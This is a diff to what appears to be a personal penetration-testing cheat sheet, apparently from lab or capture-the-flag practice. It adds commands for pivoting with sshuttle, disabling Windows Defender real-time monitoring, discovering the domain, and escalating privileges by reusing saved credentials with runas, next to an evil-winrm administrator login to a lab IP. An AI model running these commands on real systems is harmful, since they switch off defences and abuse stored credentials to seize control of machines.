@@ -479,3 +479,31 @@ We Modify the Admin Passwd:
 We connect as Admin:
     ─$ evil-winrm -i 10.10.10.179 -u administrator  -p adib7575!    
     *Evil-WinRM* PS C:\Users\Administrator\Documents> 
+
+
+####################
+Port Forwarding via sshuttle
+####################
+sshuttle -r <user>@IP -e "ssh -i <password> or <privateKey>" <IPSubnet/CIDR>
+
+
+####################
+Turning of Real-Time Defender
+####################
+set cmd powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true -Verbose"
+
+
+####################
+Windows cmd to find a Domain
+####################
+systeminfo | findstr /B /C:"Domain"
+
+
+####################
+Win Priv ESC with Saved Creds
+####################
+C:>cmdkey /list
+
+if it show saved creds:
+
+C:>runas /savecred /user:user@domain.domain powershell.exe 
